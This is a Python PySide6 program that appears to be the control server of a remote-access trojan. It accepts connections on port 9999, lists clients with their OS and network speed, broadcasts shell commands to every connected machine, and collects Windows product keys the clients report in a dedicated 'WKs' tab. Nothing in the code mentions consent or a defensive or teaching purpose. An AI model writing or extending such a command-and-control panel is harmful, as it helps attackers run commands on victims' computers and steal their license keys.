import sys
import socket
import threading
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QTableWidget, QTableWidgetItem, QTabWidget,
    QVBoxLayout, QWidget, QPushButton, QTextEdit
)
from PySide6.QtCore import Qt


class Server(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Multi-User Remote Control Server")
        self.setGeometry(100, 100, 800, 600)

        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        # Tabs
        self.clients_tab = QWidget()
        self.menu_tab = QWidget()
        self.shell_tab = QWidget()
        self.wks_tab = QWidget()

        # Add tabs to the main widget
        self.tabs.addTab(self.clients_tab, "Clients")
        self.tabs.addTab(self.menu_tab, "Menu")
        self.tabs.addTab(self.shell_tab, "Shell")
        self.tabs.addTab(self.wks_tab, "WKs")

        # Initialize UI for each tab
        self.clients_ui()
        self.menu_ui()
        self.shell_ui()
        self.wks_ui()

        # Networking
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(("0.0.0.0", 9999))  # Bind to all available interfaces
        self.server_socket.listen(5)  # Allow up to 5 simultaneous connections
        self.clients = {}  # {addr: socket}

        threading.Thread(target=self.accept_clients, daemon=True).start()

    def clients_ui(self):
        layout = QVBoxLayout()
        self.clients_table = QTableWidget()
        self.clients_table.setColumnCount(1)
        self.clients_table.setHorizontalHeaderLabels(["Clients (IP)"])
        layout.addWidget(self.clients_table)
        self.clients_tab.setLayout(layout)

    def menu_ui(self):
        layout = QVBoxLayout()
        self.menu_table = QTableWidget()
        self.menu_table.setColumnCount(4)
        self.menu_table.setHorizontalHeaderLabels(["Client", "OS", "Upload Speed (KB/s)", "Download Speed (KB/s)"])
        layout.addWidget(self.menu_table)
        self.menu_tab.setLayout(layout)

    def shell_ui(self):
        layout = QVBoxLayout()
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        layout.addWidget(self.shell_output)

        self.shell_input = QTextEdit()
        self.shell_input.setPlaceholderText("Enter shell command here...")
        layout.addWidget(self.shell_input)

        self.execute_shell_button = QPushButton("Execute Command")
        self.execute_shell_button.clicked.connect(self.execute_shell_command)
        layout.addWidget(self.execute_shell_button)

        self.shell_tab.setLayout(layout)

    def wks_ui(self):
        layout = QVBoxLayout()
        self.wks_table = QTableWidget()
        self.wks_table.setColumnCount(2)
        self.wks_table.setHorizontalHeaderLabels(["Client", "Windows Key"])
        layout.addWidget(self.wks_table)
        self.wks_tab.setLayout(layout)

    def accept_clients(self):
        while True:
            client_socket, addr = self.server_socket.accept()
            self.clients[addr[0]] = client_socket
            self.update_clients_table(addr[0])
            threading.Thread(target=self.handle_client, args=(client_socket, addr), daemon=True).start()

    def update_clients_table(self, client_ip):
        row = self.clients_table.rowCount()
        self.clients_table.insertRow(row)
        self.clients_table.setItem(row, 0, QTableWidgetItem(client_ip))

    def handle_client(self, client_socket, addr):
        try:
            while True:
                data = client_socket.recv(1024).decode()
                if data.startswith("OS: "):
                    self.update_menu_table(addr[0], data[4:], 0, 0)  # Initial speed is 0 KB/s
                elif data.startswith("Speed: "):
                    # Parse speed data
                    speed_data = data.split("Speed: ")[1]
                    upload_speed, download_speed = map(float, speed_data.replace(" KB/s", "").split(","))
                    self.update_menu_table(addr[0], None, upload_speed, download_speed)
                elif data.startswith("Windows Key: "):
                    self.update_wks_table(addr[0], data[13:])
                else:
                    self.update_shell_output(f"[{addr[0]}]: {data}")
        except Exception as e:
            print(f"[ERROR] Client {addr[0]} disconnected: {e}")
            del self.clients[addr[0]]

    def update_menu_table(self, client_ip, os_info=None, upload_speed=None, download_speed=None):
        # Find the row for this client
        row = None
        for i in range(self.menu_table.rowCount()):
            if self.menu_table.item(i, 0).text() == client_ip:
                row = i
                break

        # If the client is new, add a row
        if row is None:
            row = self.menu_table.rowCount()
            self.menu_table.insertRow(row)
            self.menu_table.setItem(row, 0, QTableWidgetItem(client_ip))

        # Update OS info if provided
        if os_info:
            self.menu_table.setItem(row, 1, QTableWidgetItem(os_info))

        # Update upload and download speeds
        if upload_speed is not None:
            self.menu_table.setItem(row, 2, QTableWidgetItem(f"{upload_speed:.2f} KB/s"))
        if download_speed is not None:
            self.menu_table.setItem(row, 3, QTableWidgetItem(f"{download_speed:.2f} KB/s"))

    def update_wks_table(self, client_ip, windows_key):
        row = self.wks_table.rowCount()
        self.wks_table.insertRow(row)
        self.wks_table.setItem(row, 0, QTableWidgetItem(client_ip))
        self.wks_table.setItem(row, 1, QTableWidgetItem(windows_key))

    def update_shell_output(self, text):
        self.shell_output.append(text)

    def execute_shell_command(self):
        command = self.shell_input.toPlainText()
        self.shell_input.clear()
        # Send the shell command to all connected clients
        if self.clients:
            for client_ip, client_socket in self.clients.items():
                try:
                    client_socket.send(f"shell:{command}".encode())
                except Exception as e:
                    print(f"[ERROR] Could not send command to {client_ip}: {e}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    server = Server()
    server.show()
    sys.exit(app.exec())
